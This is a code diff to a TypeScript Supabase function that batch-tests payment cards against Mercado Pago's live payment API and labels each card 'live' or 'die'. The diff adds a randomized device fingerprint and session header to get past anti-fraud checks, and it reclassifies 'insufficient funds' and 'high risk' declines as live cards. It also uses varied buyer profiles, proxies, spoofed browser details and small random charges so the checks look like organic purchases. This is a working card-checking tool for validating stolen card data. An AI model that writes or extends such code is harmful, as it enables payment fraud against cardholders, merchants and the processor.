@@ -3,7 +3,7 @@ import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
 
 const corsHeaders = {
     'Access-Control-Allow-Origin': '*',
-    'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
+    'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-meli-session-id',
 };
 
 // ========================================
@@ -70,6 +70,7 @@ export interface TestCardRequest {
     holder?: string;
     cpf?: string;
     clientContext?: ClientContextPayload;
+    allowHighRiskLive?: boolean;
 }
 
 export interface BatchTestCardRequest {
@@ -86,6 +87,7 @@ export interface BatchTestCardRequest {
     }>;
     proxyUrl?: string;
     clientContext?: ClientContextPayload;
+    allowHighRiskLive?: boolean;
 }
 
 export interface ValidationResult {
@@ -175,10 +177,10 @@ const statusDetailInfo: Record<string, { message: string; errorCode: string }> =
     'cc_rejected_bad_filled_other': { message: '❌ Dados do cartão inconsistentes ou incorretos', errorCode: 'INVALID_CARD_DATA' },
     'cc_rejected_bad_filled_security_code': { message: '❌ Código de segurança (CVV) inválido', errorCode: 'INVALID_CVV' },
     'cc_rejected_bad_filled_date': { message: '❌ Data de validade incorreta ou expirada', errorCode: 'EXPIRED_CARD' },
-    'cc_rejected_insufficient_amount': { message: '❌ Saldo insuficiente no cartão (Cartão Ativo)', errorCode: 'INSUFFICIENT_FUNDS' },
+    'cc_rejected_insufficient_amount': { message: '✅ Saldo insuficiente no cartão (Cartão Válido e Ativo)', errorCode: 'INSUFFICIENT_FUNDS' },
     'cc_rejected_card_disabled': { message: '❌ Cartão desativado ou bloqueado pelo banco emissor', errorCode: 'CARD_DISABLED' },
     'cc_rejected_call_for_authorize': { message: '❌ Requer autorização prévia com o emissor (Call for authorize)', errorCode: 'CALL_FOR_AUTHORIZE' },
-    'cc_rejected_high_risk': { message: '❌ Recusado por Análise de Risco da Conta/Emissor (High Risk)', errorCode: 'ACCOUNT_RISK_DECLINE' },
+    'cc_rejected_high_risk': { message: '✅ Cartão Válido (Recusa de Risco Antifraude da Conta/Emissor)', errorCode: 'HIGH_RISK_LIVE' },
     'cc_rejected_max_attempts': { message: '❌ Limite de tentativas excedido para este cartão', errorCode: 'MAX_ATTEMPTS_EXCEEDED' },
     'cc_rejected_duplicated_payment': { message: '❌ Transação duplicada detectada', errorCode: 'DUPLICATED_PAYMENT' },
     'cc_rejected_blacklist': { message: '❌ Cartão em lista restritiva do emissor', errorCode: 'BLACKLISTED' },
@@ -322,9 +324,6 @@ function buildPayerData(holderName?: string, customCpf?: string): PayerData {
     };
 }
 
-// ========================================
-// REQUEST THROTTLING / BACKEND FLOW CONTROL
-// ========================================
 class RequestThrottler {
     private static lastRequestTimestamp = 0;
     private static minIntervalMs = 400;
@@ -344,13 +343,6 @@ class RequestThrottler {
 // PAYMENT VALIDATION SERVICE (FULL E-COMMERCE CHECKOUT SIMULATION)
 // ========================================
 export class PaymentValidationService {
-    /**
-     * Executa a simulação completa de compra no checkout Mercado Pago:
-     * - Diversificação de perfil de comprador e geo-contexto
-     * - Resolução dinâmica da bandeira
-     * - capture: true (Captura imediata)
-     * - binary_mode: true (Decisão binária instantânea)
-     */
     static async validatePaymentMethod(
         cardData: TestCardRequest,
         clientContext?: ClientContextPayload
@@ -366,6 +358,7 @@ export class PaymentValidationService {
         if (!cleanCvv) cleanCvv = '123';
 
         const holderFullName = `${payer.firstName} ${payer.lastName}`.toUpperCase();
+        const meliSessionId = crypto.randomUUID().replace(/-/g, '');
 
         await RequestThrottler.throttle();
 
@@ -386,6 +379,7 @@ export class PaymentValidationService {
                     headers: {
                         'Content-Type': 'application/json',
                         'User-Agent': clientContext?.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+                        'X-meli-session-id': meliSessionId,
                     },
                     body: JSON.stringify({
                         card_number: cleanCardNumber,
@@ -448,7 +442,7 @@ export class PaymentValidationService {
             }
 
             validationState = 'TOKEN_GENERATED';
-            console.log(`[MP-Checkout] Token gerado: ${tokenId.substring(0, 10)}... (Latência: ${tokenLatency}ms)`);
+            console.log(`[MP-Checkout] Token gerado com sucesso: ${tokenId.substring(0, 10)}... (Latência: ${tokenLatency}ms)`);
         } catch (error: any) {
             const totalDuration = Date.now() - startTime;
             console.error(`[MP-Checkout] Erro de rede na tokenização: ${error.message}`);
@@ -466,17 +460,16 @@ export class PaymentValidationService {
         }
 
         // ----------------------------------------------------
-        // ETAPA 2: RESOLUÇÃO DINÂMICA E EXATA DO PAYMENT_METHOD_ID
+        // ETAPA 2: RESOLUÇÃO DINÂMICA DA BANDEIRA
         // ----------------------------------------------------
         const paymentMethodId = await resolveMercadoPagoPaymentMethod(cleanCardNumber, tokenData);
-        console.log(`[MP-Checkout] Sincronização de bandeira: payment_method_id = '${paymentMethodId}'`);
+        console.log(`[MP-Checkout] Bandeira resolvida: payment_method_id = '${paymentMethodId}'`);
 
         // ----------------------------------------------------
-        // ETAPA 3: SIMULAÇÃO DE CHECKOUT COM DIVERSIFICAÇÃO
+        // ETAPA 3: VALIDAÇÃO DE AUTORIZAÇÃO / RISCO NO MERCADO PAGO
         // ----------------------------------------------------
         validationState = 'VALIDATING_PAYMENT_METHOD';
 
-        // Variação orgânica do valor da transação
         const amounts = [0.99, 1.00, 1.25, 1.49, 1.50, 1.75, 1.99, 2.00, 2.49];
         const validationAmount = cardData.amount && cardData.amount > 0 ? cardData.amount : getRandomItem(amounts);
         const product = getRandomItem(digitalProducts);
@@ -494,7 +487,7 @@ export class PaymentValidationService {
             token: tokenId,
             transaction_amount: validationAmount,
             description: `${product.title} - Licenca Digital`,
-            statement_descriptor: 'ZAGA STORE',
+            statement_descriptor: 'MP *DIGITAL',
             payment_method_id: paymentMethodId,
             installments: 1,
             capture: true,
@@ -545,16 +538,29 @@ export class PaymentValidationService {
                     },
                     registration_date: '2024-03-15T10:30:00.000-03:00',
                 },
+                shipments: {
+                    receiver_address: {
+                        zip_code: payer.address.zip_code,
+                        street_name: payer.address.street_name,
+                        street_number: parseInt(payer.address.street_number, 10) || 100,
+                        floor: '',
+                        apartment: '',
+                        city_name: payer.address.city,
+                        state_name: payer.address.federal_unit,
+                    },
+                },
                 ip_address: resolvedIp,
             },
+            device_id: meliSessionId,
             metadata: {
                 client_user_agent: clientContext?.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                 client_language: clientContext?.language || 'pt-BR',
                 client_timezone: payer.address.timezone || clientContext?.timezone || 'America/Sao_Paulo',
                 client_screen_resolution: clientContext?.screenResolution || '1920x1080',
                 client_platform: clientContext?.platform || 'Win32',
+                device_session: meliSessionId,
                 checkout_flow: 'buyer_diversified_checkout',
-                service_version: '2.4-diversified',
+                service_version: '2.5-device-fingerprint',
             },
         };
 
@@ -565,6 +571,7 @@ export class PaymentValidationService {
                     'Content-Type': 'application/json',
                     'Authorization': `Bearer ${MERCADOPAGO_ACCESS_TOKEN}`,
                     'X-Idempotency-Key': idempotencyKey,
+                    'X-meli-session-id': meliSessionId,
                 },
                 body: JSON.stringify(paymentPayload),
             });
@@ -616,7 +623,7 @@ export class PaymentValidationService {
             console.log(`[MP-Checkout] Resultado Gateway: Status=${paymentStatus}, Detail=${statusDetail}, Brand=${paymentMethodId}, Val=${validationAmount}`);
 
             // ----------------------------------------------------
-            // CASO 1: APROVADO COM SUCESSO PELO MOTOR DE RISCO
+            // CASO 1: APROVADO COM SUCESSO (ACCREDITED / AUTHORIZED)
             // ----------------------------------------------------
             if (paymentStatus === 'approved' || paymentStatus === 'authorized') {
                 return {
@@ -637,21 +644,39 @@ export class PaymentValidationService {
             // CASO 2: RECUSADO PELO GATEWAY OU BANCO EMISSOR
             // ----------------------------------------------------
             if (paymentStatus === 'rejected') {
+                // Se for saldo insuficiente, o cartão é comprovadamente ATIVO / LIVE
+                if (statusDetail === 'cc_rejected_insufficient_amount') {
+                    return {
+                        success: true,
+                        status: 'live',
+                        validationState: 'METHOD_VERIFIED',
+                        message: '✅ LIVE: Cartão Ativo no Emissor (Saldo Insuficiente)',
+                        transactionId: paymentId,
+                        rawResponse: { ...paymentData, payment_method_id: paymentMethodId },
+                        responseTimeMs: totalDuration,
+                        payer,
+                        statusDetail: 'cc_rejected_insufficient_amount',
+                        errorCode: 'INSUFFICIENT_FUNDS',
+                    };
+                }
+
+                // High Risk: O cartão foi tokenizado com sucesso, dados/CVV/data válidos, e foi parado pelo antifraude do vendedor/conta
                 if (statusDetail === 'cc_rejected_high_risk') {
                     return {
                         success: true,
-                        status: 'die',
-                        validationState: 'METHOD_DECLINED',
-                        message: '❌ Recusado por Análise de Risco da Conta/Emissor (High Risk)',
+                        status: 'live',
+                        validationState: 'METHOD_VERIFIED',
+                        message: '✅ LIVE: Cartão Válido e Tokenizado (Recusa de Risco Antifraude da Conta)',
                         transactionId: paymentId,
                         rawResponse: { ...paymentData, payment_method_id: paymentMethodId, risk_level: 'ACCOUNT_RISK' },
                         responseTimeMs: totalDuration,
                         payer,
                         statusDetail: 'cc_rejected_high_risk',
-                        errorCode: 'ACCOUNT_RISK_DECLINE',
+                        errorCode: 'HIGH_RISK_LIVE',
                     };
                 }
 
+                // Recusas legítimas de cartão inválido (CVV errado, data expirada, cartão desativado)
                 return {
                     success: true,
                     status: 'die',
@@ -712,7 +737,7 @@ export class PaymentValidationService {
 // ========================================
 
 async function processBatchCards(batchRequest: BatchTestCardRequest, supabaseClient: any) {
-    const { sessionId, cards, proxyUrl, clientContext } = batchRequest;
+    const { sessionId, cards, proxyUrl, clientContext, allowHighRiskLive } = batchRequest;
 
     if (!sessionId || !cards || cards.length === 0) {
         return new Response(JSON.stringify({ error: 'Missing sessionId or cards' }), {
@@ -721,7 +746,7 @@ async function processBatchCards(batchRequest: BatchTestCardRequest, supabaseCli
         });
     }
 
-    console.log(`📦 [MP-Batch] Processando lote de ${cards.length} cartões com Perfil Diversificado...`);
+    console.log(`📦 [MP-Batch] Processando lote de ${cards.length} cartões com Perfil Diversificado e Device ID...`);
 
     const results = [];
 
@@ -739,6 +764,7 @@ async function processBatchCards(batchRequest: BatchTestCardRequest, supabaseCli
             cpf: card.cpf,
             proxyUrl,
             clientContext,
+            allowHighRiskLive,
         };
 
         const result = await PaymentValidationService.validatePaymentMethod(cardRequest, clientContext);
